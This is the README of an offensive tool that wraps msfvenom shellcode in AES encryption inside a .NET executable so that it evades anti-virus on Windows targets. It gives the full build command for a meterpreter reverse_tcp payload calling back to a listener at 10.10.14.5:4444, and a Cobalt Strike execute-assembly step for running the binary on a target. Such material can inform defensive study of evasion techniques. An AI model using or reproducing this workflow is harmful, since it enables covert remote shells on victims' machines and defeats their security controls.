# ShellcodeEncryptor
A simple shell code encryptor/decryptor/executor to bypass anti virus.

# Purpose
To generate a .Net binary containing base64 encoded, AES encrypted shellcode that will execute on a Windows target, bypassing anti-virus.

# Instructions

Use the `builder.py` to create the executable (you will need `mono` installed on your Linux box):
```
root@kali:~# ./launcher.py -p windows/meterpreter/reverse_tcp --arch x86 --lport 4444 --lhost 10.10.14.5 --key my_super_key -f boom.exe
[+] Generating MSFVENOM payload...
[+] Encrypting the payload...
[+] Generating launcher.cs file...
[+] Compiling the launcher...
[+] Launcher compiled and written to ./boom.exe
[+] Have a nice day!
```

Take the resulting executable and run it on the target, for example (Cobalt Strike):
```
execute-assembly ./uploads/boom.exe
```

Hopefully you will have a nice meterpreter shell.

# Notes

The `builder.cs` file is provided as a reference.
Tested with x86 windows/meterpreter/reverse_tcp
